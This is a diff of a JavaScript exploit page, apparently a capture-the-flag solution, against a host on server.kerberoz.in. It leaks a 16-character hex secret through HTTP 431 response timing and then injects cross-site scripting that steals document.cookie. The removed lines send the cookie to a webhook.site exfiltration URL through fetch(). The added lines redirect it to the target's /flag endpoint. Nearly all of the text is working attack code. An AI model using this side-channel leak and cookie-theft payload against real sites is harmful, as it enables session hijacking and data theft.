@@ -2,7 +2,6 @@
 <body>
 <script type="module">
 const BASE_URL = "http://server.kerberoz.in:3001";
-const EXFIL = "https://webhook.site/98038103-c310-4435-a24f-e74200b0aebc";
 
 const CHARS = "0123456789abcdef".split("");
 const LENGTH = 16;
@@ -22,7 +21,7 @@ const got431 = (prefix, padLength) => {
     window.onmessage = ({ data }) => {
       if (data === "ping") resolve(false);
     };
-    setTimeout(() => resolve(true), 300);
+    setTimeout(() => resolve(true), 200);
     win.location = getUrl(prefix, padLength, xss);
   });
 };
@@ -32,17 +31,23 @@ let right = 18000;
 
 const getThreshold = async () => {
   left -= 30;
+
   while (right - left > 2) {
     const mid = (right + left) >> 1;
-    if (await got431([...known, "_"], mid)) right = mid;
-    else left = mid;
+    if (await got431([...known, "_"], mid)) {
+      right = mid;
+    } else {
+      left = mid;
+    }
   }
+
   return left;
 };
 
 (async () => {
   while (known.length < LENGTH) {
     const threshold = await getThreshold();
+
     for (const c of CHARS) {
       if (await got431([...known, c], threshold)) {
         known.push(c);
@@ -51,10 +56,11 @@ const getThreshold = async () => {
     }
   }
 
+  // Internal redirect to leak cookie to /flag endpoint
   const finalUrl = getUrl(
     known,
     0,
-    `fetch("${EXFIL}?c=" + encodeURIComponent(document.cookie))`
+    `location="${BASE_URL}/flag?"+document.cookie`
   );
 
   win.location = finalUrl;
